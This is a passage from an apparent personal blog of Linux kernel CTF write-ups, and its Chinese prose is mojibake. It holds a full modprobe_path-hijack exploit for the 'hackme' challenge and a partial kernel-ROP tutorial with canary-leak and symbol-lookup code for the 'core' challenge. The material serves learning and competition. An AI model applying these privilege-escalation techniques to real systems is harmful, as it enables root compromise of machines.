class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	ioctl(fd,ALLOC,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	ioctl(fd,DEL,&amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">read_from_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,READ,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">write_to_kernel</span><span class="params">(<span class="type">int</span> fd,<span class="type">int</span> idx,<span class="type">char</span> *user,<span class="type">long</span> <span class="type">long</span> len,<span class="type">long</span> <span class="type">long</span> offset)</span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">arg</span> <span class="title">cmd</span>;</span></span><br><span class="line">	cmd.idx = idx;</span><br><span class="line">	cmd.len = len;</span><br><span class="line">	cmd.addr = user;</span><br><span class="line">	cmd.offset = offset;</span><br><span class="line">	ioctl(fd,WRITE,&amp;cmd);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">( <span class="type">char</span> *buf,<span class="type">int</span> size)</span>&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;data :\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;(size/<span class="number">8</span>);i++)&#123;</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i/<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; %16llx&quot;</span>,*(<span class="type">size_t</span> * )(buf + i*<span class="number">8</span>));</span><br><span class="line">		<span class="keyword">if</span> (i%<span class="number">2</span> == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="type">char</span> *mem = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">	<span class="type">size_t</span> heap_addr , kernel_addr,mod_addr;</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] bad open /dev/hackme\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">0</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">1</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">2</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">3</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	delete(fd,<span class="number">1</span>);</span><br><span class="line">	delete(fd,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	read_from_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	heap_addr = *((<span class="type">size_t</span>  *)mem);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] heap addr : %16llx\n&quot;</span>,heap_addr );</span><br><span class="line">	read_from_kernel(fd,<span class="number">0</span>,mem,<span class="number">0x200</span>,<span class="number">-0x200</span>);</span><br><span class="line">	kernel_addr = *((<span class="type">size_t</span>  *)(mem+<span class="number">0x28</span>)) ;</span><br><span class="line">	<span class="keyword">if</span> ((kernel_addr &amp; <span class="number">0xfff</span>) != <span class="number">0xae0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[-] maybe bad kernel leak : %16llx\n&quot;</span>,kernel_addr);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	kernel_addr -= <span class="number">0x849ae0</span>; <span class="comment">//0x849ae0 - sysctl_table_root</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] kernel addr : %16llx\n&quot;</span>,kernel_addr );	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(mem,<span class="string">&#x27;A&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x811000</span> + kernel_addr + <span class="number">0x40</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	</span><br><span class="line">	alloc(fd,<span class="number">5</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">6</span>,mem,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">	read_from_kernel(fd,<span class="number">6</span>,mem,<span class="number">0x40</span>,<span class="number">-0x40</span>);</span><br><span class="line">	mod_addr =  *((<span class="type">size_t</span>  *)(mem+<span class="number">0x18</span>)) ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] mod addr : %16llx\n&quot;</span>,mod_addr );	</span><br><span class="line">	</span><br><span class="line">	delete(fd,<span class="number">2</span>);</span><br><span class="line">	delete(fd,<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x2400</span> + mod_addr + <span class="number">0xc0</span>); <span class="comment">// mod_tree +0x40</span></span><br><span class="line">	write_to_kernel(fd,<span class="number">4</span>,mem,<span class="number">0x100</span>,<span class="number">-0x100</span>);</span><br><span class="line">	alloc(fd,<span class="number">7</span>,mem,<span class="number">0x100</span>);</span><br><span class="line">	*((<span class="type">size_t</span> *)(mem+<span class="number">0x8</span>)) = <span class="number">0x100</span>; </span><br><span class="line">	*((<span class="type">size_t</span> *)mem) = (<span class="number">0x83f960</span> + kernel_addr ); <span class="comment">//ffffffff8183f960 D modprobe_path</span></span><br><span class="line">	alloc(fd,<span class="number">8</span>,mem,<span class="number">0x100</span>); <span class="comment">// pool</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">strncpy</span>(mem,<span class="string">&quot;/home/pwn/copy.sh\0&quot;</span>,<span class="number">18</span>);</span><br><span class="line">	write_to_kernel(fd,<span class="number">0xc</span>,mem,<span class="number">18</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag /home/pwn/flag\n/bin/chmod 777 /home/pwn/flag&#x27; &gt; /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/pwn/copy.sh&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/pwn/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;chmod +x /home/pwn/dummy&quot;</span>);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;/home/pwn/dummy&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304172129949.png" alt="image-20230417212958765" style="zoom:50%;" />





<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbaoii/article/details/123583502">(47æ¡æ¶ˆæ¯) linux kernal pwn STARCTF 2019 hackmeï¼ˆä¸€ï¼‰ åŠ«æŒmodprobe_path_yongbaoiiçš„åšå®¢-CSDNåšå®¢</a></p>
<p><a target="_blank" rel="noopener" href="https://kileak.github.io/ctf/2019/xctf-hackme/">XCTF - *CTF 2019 - hack_me | kileak</a></p>
<p><a target="_blank" rel="noopener" href="http://p4nda.top/2019/05/01/starctf-2019-hackme/">(<em>Â´âˆ‡ï½€</em>) å¤©äº®äº†~ ã€KERNEL PWNã€‘STARCTF 2019 hackme è§£é¢˜æ€è·¯ | p4ndaâ€™s blog</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-254178.htm">åŸåˆ›]Linux Kernel Exploit å†…æ ¸æ¼æ´å­¦ä¹ (4)-RW Any Memory-äºŒè¿›åˆ¶æ¼æ´-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com (kanxue.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/153929.html">åŸºäºmodprobe_pathè¦†ç›–çš„Linuxå†…æ ¸æ¼æ´åˆ©ç”¨æŠ€æœ¯ - SecPulse.COM | å®‰å…¨è„‰æ</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/a31a5755.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/a31a5755.html" class="post-title-link" itemprop="url">å…³äº kernel-ROP & ret2user & bypass-SMEP çš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:59:42" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>å†…æ ¸æ€çš„ <code>ROP</code> å’Œç”¨æˆ·æ€çš„æ€è·¯å’Œåšæ³•æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯åˆ©ç”¨ <code>gadget</code> æ¥ä¸æ–­æ§åˆ¶æ‰§è¡Œæµï¼Œè¿›è¡Œä»»æ„çš„å‡½æ•°è°ƒç”¨ã€‚ä¸è¿‡è·å–åŸºåœ°å€è¿˜æœ‰æœç´¢ <code>gadget</code> ç­‰ä¸€äº›å°ç»†èŠ‚å‘ç”Ÿäº†å˜åŒ–ï¼Œä½†æ€æƒ³ä¸å˜ï¼Œæ‰€ä»¥ç†è§£èµ·æ¥åº”è¯¥è¿˜æ˜¯å¾ˆå¿«çš„</p>
<h2 id="kernel-ROP"><a href="#kernel-ROP" class="headerlink" title="kernel-ROP"></a>kernel-ROP</h2><p>ä¾‹é¢˜æ˜¯ <a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/tree/master/2018%20%E5%BC%BA%E7%BD%91%E6%9D%AFkernel%20pwn-core">2018å¼ºç½‘æ¯ pwn-core</a></p>
<h3 id="ä»£ç åˆ†æ"><a href="#ä»£ç åˆ†æ" class="headerlink" title="ä»£ç åˆ†æ"></a>ä»£ç åˆ†æ</h3><p>å‘ç° <code>ioctl</code> å‡½æ•°ä¸­å¯ä»¥æ§åˆ¶ <code>off</code> è¿™ä¸ªå…¨å±€å˜é‡ï¼ˆå¦‚ä¸‹ï¼‰</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051126597.png" alt="image-20230405112654518" style="zoom:50%;" />



<p><code>core_read</code> å‡½æ•°ï¼Œå­˜åœ¨æ•°ç»„ç´¢å¼•æº¢å‡ºçš„æ¼æ´ï¼Œ <code>off</code> æˆ‘ä»¬å¯æ§ï¼Œä¸”ç¨‹åºæ²¡æœ‰åšä»»ä½•æ£€æŸ¥ï¼Œ<code>v5</code> æ˜¯åœ¨æ ˆä¸­ï¼Œå› æ­¤é…åˆ <code>copy_to_user</code> å‡½æ•°å¯ä»¥æ³„éœ²æ ˆä¸­çš„ä»»æ„æ•°æ®ï¼Œè¿™é‡Œè€ƒè™‘æ¥æ³„éœ² <code>canary</code> ä»¥ä¾¿åé¢çš„ <code>rop</code> æ‰§è¡Œã€‚</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051128320.png" alt="image-20230405112810250" style="zoom:50%;" />



<p>é€šè¿‡åˆ†æ <code>off</code> ä¸º <code>0x40</code> çš„æ—¶å€™<code>&amp;v5[off]</code> æ­£å¥½æŒ‡å‘äº† <code>canary</code> çš„ä½ç½®ï¼ˆè¿™é‡Œå°±æ˜¯ <code>PWN</code> æ‰‹çš„åŸºæœ¬æŠ€èƒ½ï¼Œæ‰€ä»¥ä¸å†èµ˜è¿°ï¼‰ï¼Œ<code>copy_to_user</code> ä¼šå°†å†…æ ¸ä¸­çš„æ•°æ® <code>copy</code> åˆ°ç”¨æˆ·ç©ºé—´ä¸­ï¼Œä¹Ÿå°±æ˜¯èµ‹å€¼ç»™äº† <code>a1</code> ã€‚</p>
<p><code>core_copy_func</code> å‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªå¼ºè½¬çš„æ¼æ´ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå°† <code>__int64</code> ç±»å‹çš„ <code>a1</code> ï¼Œå¼ºè½¬ä¸ºäº† <code>unsigned __int16</code> ç±»å‹ï¼Œå¦‚æœæˆ‘ä»¬å°† <code>a1</code> è®¾ç½®ä¸º <code>0xffffffffffff0000 | (0xd0)</code> ï¼Œå°±å¯ä»¥åœ¨ç»•è¿‡ <code>if(a1 &gt; 63)</code> æ£€æŸ¥çš„æƒ…å†µä¸‹æ‰§è¡Œ <code>qmemcpy</code> å‡½æ•°å®Œæˆæ ˆæº¢å‡º</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081646889.png" alt="image-20230408164606742" style="zoom:50%;" />

<p>ä¸è¿‡ä¸Šé¢è¿™é‡Œåªæ˜¯èƒ½æ§åˆ¶ <code>a1</code> è¿™ä¸ªå­—èŠ‚æ•°ï¼Œæƒ³è¦ <code>ROP</code> è¿˜éœ€è¦æ§åˆ¶ <code>name</code> æ•°ç»„ä¸­çš„æ•°æ®ã€‚</p>
<p>é€šè¿‡æŸ¥çœ‹ <code>core_write</code> å‡½æ•°ï¼Œå‘ç°è¿™é‡Œå¯ä»¥ç›´æ¥æ§åˆ¶ <code>name</code> æ•°ç»„ä¸­çš„å†…å®¹ï¼Œå¦‚æ­¤ä»»æ„è¯»å’Œä»»æ„å†™éƒ½æœ‰äº†ï¼Œå°±å¯ä»¥å¼€å§‹æˆ‘ä»¬çš„ <code>kernel-ROP</code> </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081718605.png" alt="image-20230408171831543"></p>
<h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304081726031.png" alt="image-20230408172611971"></p>
<p>å› ä¸ºç¨‹åºå¼€äº† <code>canary</code> ï¼Œæ‰€ä»¥ <code>ROP</code> ä¹‹å‰éœ€è¦å…ˆè¿›è¡Œæ³„éœ² <code>canary</code></p>
<h4 id="æ³„éœ²-canary"><a href="#æ³„éœ²-canary" class="headerlink" title="æ³„éœ² canary"></a>æ³„éœ² <code>canary</code></h4><p>æ‰€ä»¥æ³„éœ² <code>canary</code> çš„éƒ¨åˆ† <code>exp</code> å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> canary=<span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="type">int</span> fd=open(<span class="string">&quot;/proc/core&quot;</span>,O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;core fd is %d\n&quot;</span>,fd);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889C</span>,<span class="number">0x40</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6677889B</span>,&amp;buf);</span><br><span class="line">    canary=(<span class="type">size_t</span>)(buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;canary is %p\n&quot;</span>,canary);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä¸€å®šè¦æ³¨æ„ï¼Œä»å†…æ ¸ <code>copy</code> è¿‡æ¥çš„æ•°æ®æœ‰ <code>64</code> ä¸ªå­—èŠ‚ï¼Œè€Œä¸æ˜¯åªæœ‰ <code>canary</code> ï¼Œå½“æ—¶ç¨‹åºå°±å®šä¹‰äº†ä¸€ä¸ª <code>int</code> ç±»å‹çš„å˜é‡  <code>canary</code> ä¼ å…¥äº†åœ°å€è¿›è¡Œæ¥æ”¶ï¼Œç»“æœç›´æ¥æŠ¥é”™ï¼ˆåŸå› æ˜¯ç ´åäº†ç”¨æˆ·ç¨‹åºçš„ <code>canary</code>ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051735283.png" alt="image-20230405173514198"></p>
<h4 id="è·å–å‡½æ•°çš„çœŸå®åœ°å€"><a href="#è·å–å‡½æ•°çš„çœŸå®åœ°å€" class="headerlink" title="è·å–å‡½æ•°çš„çœŸå®åœ°å€"></a>è·å–å‡½æ•°çš„çœŸå®åœ°å€</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>,prepare_kernel_cred = <span class="number">0</span>,vmlinux_base = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span>&#123;</span><br><span class="line">   FILE* kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="keyword">if</span>(kallsyms_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">   <span class="keyword">while</span>(fgets(buf,<span class="number">0x30</span>,kallsyms_fd))&#123;</span><br><span class="line">      <span class="keyword">if</span>(commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//End condition</span></span><br><span class="line">      <span class="comment">//find commit_creds</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>,commit_creds);</span><br><span class="line">         vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>,vmlinux_base);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//find prepare_kernel_cred</span></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred)&#123;</span><br><span class="line">         <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">         <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">         <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;prepare_kernel_cred);</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>,prepare_kernel_cred);</span><br><span class="line">         vmlinux_base = prepare_kernel_cred - <span class="number">0x9cce0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(!commit_creds &amp; !prepare_kernel_cred)&#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[*]read kallsyms error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>ä» <code>/proc/kallsyms</code> æ–‡ä»¶ä¸­å¯ä»¥è·å–ä»»æ„ä¸€ä¸ªå‡½æ•°çš„çœŸå®åœ°å€ï¼Œæœ¬é¢˜çš„ <code>init</code> æ–‡ä»¶ä¸­å°† <code>/proc/kallsyms</code> æ–‡ä»¶ <code>copy</code> äº†ä¸€ä»½å«åš <code>/tmp/kallsyms</code> ï¼Œè¯»å–è¯¥æ–‡ä»¶ï¼Œå³å¯å¾—åˆ°å‡½æ•°çš„çœŸå®åœ°å€ï¼Œä½†å¦‚æœæƒ³è·å– <code>vmlinux</code> ä¸­çš„åŸºåœ°å€ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‹¿åˆ°å‡½æ•°åœ¨ <code>vmlinux</code> ä¸­çš„åç§»ã€‚</p>
<h5 id="è·å–vmlinuxä¸­çš„å‡½æ•°åç§»"><a href="#è·å–vmlinuxä¸­çš„å‡½æ•°åç§»" class="headerlink" title="è·å–vmlinuxä¸­çš„å‡½æ•°åç§»"></a>è·å–vmlinuxä¸­çš„å‡½æ•°åç§»</h5><p>å› ä¸ºå¼€äº† <code>KASLR</code> ï¼Œæ‰€ä»¥å‡½æ•°çš„çœŸå®åœ°å€éœ€è¦è·å–åŸºåœ°å€å’Œå‡½æ•°åç§»æ‰è¡Œã€‚</p>
<p>ä½¿ç”¨ <code>readelf -s vmlinux | grep vuln</code> è·å–å…¶åœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051802154.png" alt="image-20230405180248088"></p>
<p>ç„¶åå†ç”¨ <code>checksec</code> å‘½ä»¤æ¥è·å–åŸºåœ°å€ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304051804686.png" alt="image-20230405180406627"></p>
<p>å¾—åˆ° <code>prepare_kernel_cred</code> çš„åç§»ä¸º <code>0x9cce0</code>  , <code>commit_creds</code> å‡½æ•°çš„åç§»ä¸º <code>0x9c8e0</code> </p>
<p>æŠŠè¿™äº›åç§»å†™å›åˆ°ä¸Šé¢çš„è„šæœ¬å³å¯ï¼Œä¹‹æ‰€ä»¥è¦æ‹¿åˆ° <code>vmlinux</code> çš„åŸºåœ°å€æ˜¯å› ä¸ºåç»­çš„ <code>gadget</code> åç§»éœ€è¦åŠ ä¸ŠåŸºåœ°å€æ‰èƒ½å¾—åˆ° <code>gadget</code> çš„çœŸå®åœ°å€ã€‚</p>
<h4 id="è·å–-gadget"><a href="#è·å–-gadget" class="headerlink" title="è·å– gadget"></a>è·å– <code>gadget</code></h4><p>å¦‚ä¸‹æ–¹æ³•æŸ¥çœ‹ <code>gadget</code> ä¼šæ¯”è¾ƒæ–¹ä¾¿</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary vmlinux &gt; ropgadget</span><br><span class="line">grep &#x27;: pop rdi ; ret&#x27; ropgadget </span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ç”¨ <code>vscode</code> æ‰“å¼€ <code>ropgadget</code> æ–‡ä»¶ï¼Œ <code>ctrl+f</code> æ¥æœç´¢ä¹Ÿå¯ä»¥</p>
<p>æ‰¾åˆ°çš„ <code>gadget</code> éœ€è¦å…ˆå‡å» <code>vmlinux</code> çš„åŸºåœ°å€å¾—åˆ° <code>gadget</code> çš„åç§»</p>
<p>æœ€ååœ¨ <code>exp</code> ä¸­ï¼Œä¸€ä¸ª <code>gadget</code> çš„çœŸå®åœ°å€åº”è¯¥æ˜¯ <code>vmlinux_base</code> åŠ ä¸Šå…¶åç§»</p>
<h4 id="ROP-é“¾çš„å¸ƒç½®"><a href="#ROP-é“¾çš„å¸ƒç½®" class="headerlink" title="ROP é“¾çš„å¸ƒç½®"></a><code>ROP</code> é“¾çš„å¸ƒç½®</h4><p>æˆ‘ä»¬æœ€åå¸Œæœ›ç”¨ <code>ROP</code> æ¥æ‰§è¡Œ <code>commit_creds(prepare_kernel_cred(0))</code> ï¼Œ<code>prepare_kernel_cred(0)</code> ä¼šè¿”å›ä¸€ä¸ª <code>root</code> æƒé™çš„ <code>cred</code> ç»“æ„ä½“æŒ‡é’ˆï¼Œè€Œ <code>commit_creds</code> å‡½æ•°å¯ä»¥å°†è¯¥ç»“æ„ä½“æŒ‡é’ˆä½œç”¨äºå½“å‰è¿›ç¨‹ï¼Œæ¥ç€æˆ‘ä»¬è¿”å›ç”¨æˆ·æ€ï¼Œå»æ‰§è¡Œä¸€ä¸ª <code>system(&quot;/bin/sh&quot;)</code> ä¾¿å¯ä»¥ç¨³å®šçš„ä»¥ <code>root</code> æƒé™æ‰§è¡Œå‘½ä»¤äº†ã€‚</p>
